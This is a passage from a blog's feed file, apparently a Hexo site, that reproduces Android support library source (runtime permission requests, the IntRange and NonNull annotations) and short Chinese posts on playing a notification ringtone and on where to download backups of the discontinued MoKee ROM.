class="bullet">     * </span>Requests permissions to be granted to this application. These permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>must be requested in </span>your<span class="markdown"> manifest, </span>they<span class="markdown"> </span>should<span class="markdown"> not be granted to </span>your<span class="markdown"> app,</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>and </span>they<span class="markdown"> </span>should<span class="markdown"> have protection level &#123;@link android.content.pm.PermissionInfo</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>#PROTECTION_DANGEROUS dangerous&#125;, regardless whether </span>they<span class="markdown"> </span>are<span class="markdown"> declared by</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span></span>the<span class="markdown"> platform or </span>a<span class="markdown"> third-party app.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Normal permissions &#123;@link android.content.pm.PermissionInfo#PROTECTION_NORMAL&#125;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span></span>are<span class="markdown"> granted at install time if requested in </span>the<span class="markdown"> manifest. Signature permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>&#123;@link android.content.pm.PermissionInfo#PROTECTION_SIGNATURE&#125; </span>are<span class="markdown"> granted at</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>install time if requested in </span>the<span class="markdown"> manifest and </span>the<span class="markdown"> signature of </span>your<span class="markdown"> app matches</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span></span>the<span class="markdown"> signature of </span>the<span class="markdown"> app declaring </span>the<span class="markdown"> permissions.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>If </span>your<span class="markdown"> app does not have </span>the<span class="markdown"> requested permissions </span>the<span class="markdown"> user </span>will<span class="markdown"> be presented</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>with UI for accepting them. After </span>the<span class="markdown"> user has accepted or rejected </span>the</span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>requested permissions </span>you<span class="markdown"> </span>will<span class="markdown"> receive </span>a<span class="markdown"> callback reporting whether </span>the</span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>permissions were granted or not. Your activity has to implement &#123;@link</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>android.support.v4.app.ActivityCompat.OnRequestPermissionsResultCallback&#125;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>and </span>the<span class="markdown"> results of permission requests </span>will<span class="markdown"> be delivered to its &#123;@link</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>android.support.v4.app.ActivityCompat.OnRequestPermissionsResultCallback#onRequestPermissionsResult(</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>int, String[], int[])&#125; method.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Note that requesting </span>a<span class="markdown"> permission does not guarantee it </span>will<span class="markdown"> be granted and</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span></span>your<span class="markdown"> app </span>should<span class="markdown"> be able to run without having this permission.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>This method may start </span>an<span class="markdown"> activity allowing </span>the<span class="markdown"> user to choose which permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>to grant and which to reject. Hence, </span>you<span class="markdown"> </span>should<span class="markdown"> be prepared that </span>your<span class="markdown"> activity</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>may be paused and resumed. Further, granting some permissions may require</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span></span>a<span class="markdown"> restart of </span>you<span class="markdown"> application. In </span>such<span class="markdown"> </span>a<span class="markdown"> case, </span>the<span class="markdown"> system </span>will<span class="markdown"> recreate </span>the</span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>activity stack before delivering </span>the<span class="markdown"> result to </span>your</span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>&#123;@link ActivityCompat.OnRequestPermissionsResultCallback#onRequestPermissionsResult(int, String[], int[])&#125;.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>When checking whether </span>you<span class="markdown"> have </span>a<span class="markdown"> permission </span>you<span class="markdown"> </span>should<span class="markdown"> use &#123;@link</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>#checkSelfPermission(android.content.Context, String)&#125;.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Calling this API for permissions already granted to </span>your<span class="markdown"> app would show UI</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>to </span>the<span class="markdown"> user to decided whether </span>the<span class="markdown"> app can still hold these permissions. This</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>can be useful if </span>the<span class="markdown"> way </span>your<span class="markdown"> app uses </span>the<span class="markdown"> data guarded by </span>the<span class="markdown"> permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>changes significantly.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>You cannot request </span>a<span class="markdown"> permission if </span>your<span class="markdown"> activity sets &#123;@link</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>android.R.attr#noHistory noHistory&#125; to <span class="xml"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span>true<span class="xml"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span> in </span>the<span class="markdown"> manifest</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>because in this case </span>the<span class="markdown"> activity would not receive result callbacks including</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>&#123;@link ActivityCompat.OnRequestPermissionsResultCallback#onRequestPermissionsResult(int, String[], int[])&#125;.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>The <span class="xml"><span class="tag">&lt;</span></span></span>a<span class="markdown"><span class="xml"> href="http://developer.android.com/samples/RuntimePermissions/index.html"&gt;</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>RuntimePermissions<span class="xml"><span class="tag">&lt;/</span></span></span>a<span class="markdown"><span class="xml">&gt;</span> sample app demonstrates how to use this method to</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>request permissions at run time.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param activity The target activity.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param permissions The requested permissions. Must me non-null and not empty.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param requestCode Application specific request code to match with </span>a<span class="markdown"> result</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *    </span>reported to &#123;@link ActivityCompat.OnRequestPermissionsResultCallback#onRequestPermissionsResult(int, String[], int[])&#125;.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *    </span>Should be &gt;= 0.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@see ActivityCompat.OnRequestPermissionsResultCallback#onRequestPermissionsResult(int, String[], int[])</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@see #checkSelfPermission(android.content.Context, String)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@see #shouldShowRequestPermissionRationale(android.app.Activity, String)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> requestPermissions(<span class="keyword">final</span> <span class="meta">@NonNull</span> Activity activity,</span><br><span class="line">                                          <span class="keyword">final</span> <span class="meta">@NonNull</span> <span class="built_in">String</span>[] permissions, <span class="keyword">final</span> <span class="meta">@IntRange</span>(from = <span class="number">0</span>) <span class="built_in">int</span> requestCode) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (activity instanceof RequestPermissionsRequestCodeValidator) &#123;</span><br><span class="line">                ((RequestPermissionsRequestCodeValidator) activity)</span><br><span class="line">                        .validateRequestPermissionsRequestCode(requestCode);</span><br><span class="line">            &#125;</span><br><span class="line">            activity.requestPermissions(permissions, requestCode);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (activity instanceof OnRequestPermissionsResultCallback) &#123;</span><br><span class="line">            Handler handler = <span class="keyword">new</span> Handler(Looper.getMainLooper());</span><br><span class="line">            handler.post(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                public <span class="keyword">void</span> run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="built_in">int</span>[] grantResults = <span class="keyword">new</span> <span class="built_in">int</span>[permissions.length];</span><br><span class="line"></span><br><span class="line">                    PackageManager packageManager = activity.getPackageManager();</span><br><span class="line">                    <span class="built_in">String</span> packageName = activity.getPackageName();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> <span class="built_in">int</span> permissionCount = permissions.length;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; permissionCount; i++) &#123;</span><br><span class="line">                        grantResults[i] = packageManager.checkPermission(</span><br><span class="line">                                permissions[i], packageName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ((OnRequestPermissionsResultCallback) activity).onRequestPermissionsResult(</span><br><span class="line">                            requestCode, permissions, grantResults);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@hide</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    public <span class="class"><span class="keyword">interface</span> <span class="title">RequestPermissionsRequestCodeValidator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span> validateRequestPermissionsRequestCode(<span class="built_in">int</span> requestCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="class"><span class="keyword">interface</span> <span class="title">OnRequestPermissionsResultCallback</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>Callback for </span>the<span class="markdown"> result from requesting permissions. This method</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>is invoked for every call on &#123;@link #requestPermissions(android.app.Activity,</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>String[], int)&#125;.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span><span class="xml"><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span>Note:<span class="xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span> It is possible that </span>the<span class="markdown"> permissions request interaction</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>with </span>the<span class="markdown"> user is interrupted. In this case </span>you<span class="markdown"> </span>will<span class="markdown"> receive empty permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>and results arrays which </span>should<span class="markdown"> be treated as </span>a<span class="markdown"> cancellation.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">         *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>@param requestCode The request code passed in &#123;@link #requestPermissions(</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>android.app.Activity, String[], int)&#125;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>@param permissions The requested permissions. Never null.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>@param grantResults The grant results for </span>the<span class="markdown"> corresponding permissions</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         *     </span>which is either &#123;@link android.content.pm.PackageManager#PERMISSION_GRANTED&#125;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         *     </span>or &#123;@link android.content.pm.PackageManager#PERMISSION_DENIED&#125;. Never null.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">         *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">         * </span>@see #requestPermissions(android.app.Activity, String[], int)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">         */</span></span></span></span><br><span class="line">        <span class="keyword">void</span> onRequestPermissionsResult(<span class="built_in">int</span> requestCode, <span class="meta">@NonNull</span> <span class="built_in">String</span>[] permissions,</span><br><span class="line">                                        <span class="meta">@NonNull</span> <span class="built_in">int</span>[] grantResults);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Determine whether <span class="xml"><span class="tag">&lt;<span class="name">em</span>&gt;</span></span></span>you<span class="markdown"><span class="xml"><span class="tag">&lt;/<span class="name">em</span>&gt;</span></span> have been granted </span>a<span class="markdown"> particular permission.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param permission The name of </span>the<span class="markdown"> permission being checked.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return &#123;@link android.content.pm.PackageManager#PERMISSION_GRANTED&#125; if </span>you<span class="markdown"> have </span>the</span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>permission, or &#123;@link android.content.pm.PackageManager#PERMISSION_DENIED&#125; if not.</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@see android.content.pm.PackageManager#checkPermission(String, String)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    public <span class="keyword">static</span> <span class="built_in">int</span> checkSelfPermission(<span class="meta">@NonNull</span> Context context, <span class="meta">@NonNull</span> <span class="built_in">String</span> permission) &#123;</span><br><span class="line">        <span class="keyword">if</span> (permission == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"permission is null"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> context.checkPermission(permission, android.os.Process.myPid(), Process.myUid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IntRange.java</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Copyright (C) <span class="number">2015</span> The Android Open Source Project</span><br><span class="line"> *</span><br><span class="line"> * Licensed under the Apache License, Version <span class="number">2.0</span> (the <span class="string">"License"</span>);</span><br><span class="line"> * you may not use this file except in compliance <span class="keyword">with</span> the License.</span><br><span class="line"> * You may obtain a copy <span class="keyword">of</span> the License at</span><br><span class="line"> *</span><br><span class="line"> *      <span class="symbol">http:</span>/<span class="regexp">/www.apache.org/licenses</span><span class="regexp">/LICENSE-2.0</span></span><br><span class="line"><span class="regexp"> *</span></span><br><span class="line"><span class="regexp"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="regexp"> * distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="regexp"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="regexp"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="regexp"> * limitations under the License.</span></span><br><span class="line"><span class="regexp"> */</span></span><br><span class="line">package android.support.<span class="keyword">annotation</span>;</span><br><span class="line"></span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">ANNOTATION_TYPE</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">FIELD</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">LOCAL_VARIABLE</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">METHOD</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">PARAMETER</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">RetentionPolicy</span>.<span class="title">CLASS</span>;</span><br><span class="line"></span><br><span class="line">import java.lang.<span class="keyword">annotation</span>.<span class="title">Retention</span>;</span><br><span class="line">import java.lang.<span class="keyword">annotation</span>.<span class="title">Target</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Denotes that the annotated element should be an int or long in the given range</span><br><span class="line"> * &lt;p&gt;</span><br><span class="line"> * <span class="symbol">Example:</span></span><br><span class="line"> * &lt;pre&gt;&lt;code&gt;</span><br><span class="line"> *  &amp;<span class="comment">#64;IntRange(from=0,to=255)</span></span><br><span class="line"> *  public int getAlpha() &#123;</span><br><span class="line"> *      ...</span><br><span class="line"> *  &#125;</span><br><span class="line"> * &lt;<span class="regexp">/code&gt;&lt;/pre</span>&gt;</span><br><span class="line"> *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">@Retention(CLASS)</span></span><br><span class="line"><span class="regexp">@Target(&#123;METHOD,PARAMETER,FIELD,LOCAL_VARIABLE,ANNOTATION_TYPE&#125;)</span></span><br><span class="line"><span class="regexp">public @interface IntRange &#123;</span></span><br><span class="line"><span class="regexp">    /</span>** Smallest value, inclusive *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    long from() default Long.MIN_VALUE;</span></span><br><span class="line"><span class="regexp">    /</span>** Largest value, inclusive *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    long to() default Long.MAX_VALUE;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>NonNull.java</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Copyright (C) <span class="number">2013</span> The Android Open Source Project</span><br><span class="line"> *</span><br><span class="line"> * Licensed under the Apache License, Version <span class="number">2.0</span> (the <span class="string">"License"</span>);</span><br><span class="line"> * you may not use this file except in compliance <span class="keyword">with</span> the License.</span><br><span class="line"> * You may obtain a copy <span class="keyword">of</span> the License at</span><br><span class="line"> *</span><br><span class="line"> *      <span class="symbol">http:</span>/<span class="regexp">/www.apache.org/licenses</span><span class="regexp">/LICENSE-2.0</span></span><br><span class="line"><span class="regexp"> *</span></span><br><span class="line"><span class="regexp"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="regexp"> * distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="regexp"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="regexp"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="regexp"> * limitations under the License.</span></span><br><span class="line"><span class="regexp"> */</span></span><br><span class="line">package android.support.<span class="keyword">annotation</span>;</span><br><span class="line"></span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">ANNOTATION_TYPE</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">FIELD</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">LOCAL_VARIABLE</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">METHOD</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">PACKAGE</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">ElementType</span>.<span class="title">PARAMETER</span>;</span><br><span class="line">import static java.lang.<span class="keyword">annotation</span>.<span class="title">RetentionPolicy</span>.<span class="title">CLASS</span>;</span><br><span class="line"></span><br><span class="line">import java.lang.<span class="keyword">annotation</span>.<span class="title">Documented</span>;</span><br><span class="line">import java.lang.<span class="keyword">annotation</span>.<span class="title">Retention</span>;</span><br><span class="line">import java.lang.<span class="keyword">annotation</span>.<span class="title">Target</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Denotes that a parameter, field or method <span class="keyword">return</span> value can never be null.</span><br><span class="line"> * &lt;p&gt;</span><br><span class="line"> * This is a marker <span class="keyword">annotation</span> <span class="title">and</span> <span class="title">it</span> <span class="title">has</span> <span class="title">no</span> <span class="title">specific</span> <span class="title">attributes</span>.</span><br><span class="line"> *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">@Documented</span></span><br><span class="line"><span class="regexp">@Retention(CLASS)</span></span><br><span class="line"><span class="regexp">@Target(&#123;METHOD, PARAMETER, FIELD, LOCAL_VARIABLE, ANNOTATION_TYPE, PACKAGE&#125;)</span></span><br><span class="line"><span class="regexp">public @interface NonNull &#123;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>播放系统通知铃声</title>
      <link href="/2023/bo-fang-xi-tong-tong-zhi-ling-sheng/"/>
      <url>/2023/bo-fang-xi-tong-tong-zhi-ling-sheng/</url>
      
        <content type="html"><![CDATA[<p>声音：系统通知铃声<br>音量：铃声音量  </p><a id="more"></a>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);</span><br><span class="line">Ringtone ringtone = RingtoneManager.getRingtone(<span class="keyword">this</span>, notification);</span><br><span class="line">ringtone.play();</span><br></pre></td></tr></table></figure><p>播放raw中指定声音</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RingtoneManager.getRingtone(<span class="keyword">this</span>, Uri.parse(<span class="string">"android.resource://"</span>+getPackageName()+<span class="string">"/"</span>+R.raw.sound)).play();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔趣下载</title>
      <link href="/2023/mo-qu-xia-zai/"/>
      <url>/2023/mo-qu-xia-zai/</url>
      
        <content type="html"><![CDATA[<p>魔趣开源项目2023-01-07删库跑路（20121212 ~ 20230107）  </p><a id="more"></a>  <p>不过还好下载页的ROM马丁龙猪已经备份到 sourceforge ，老机型想刷机还能下载到</p><p>sourceforge：<a href="https://sourceforge.net/projects/mokee/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/mokee/files/</a></p><p><img src="/img/preloader.gif" data-original="w.jpg" alt></p><p>删库跑路的说明： </p><p>微博：<a href="https://m.weibo.cn/detail/4855282062066487" target="_blank" rel="noopener">https://m.weibo.cn/detail/4855282062066487</a><br>马丁龙猪的博客：<a href="https://blog.mokeedev.com/2023/01/1437/" target="_blank" rel="noopener">https://blog.mokeedev.com/2023/01/1437/</a></p><p><img src="/img/preloader.gif" data-original="weibo.jpg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mrp商店</title>
      <link href="/2023/mrp-shang-dian/"/>
      <url>/2023/mrp-shang-dian/</url>
      
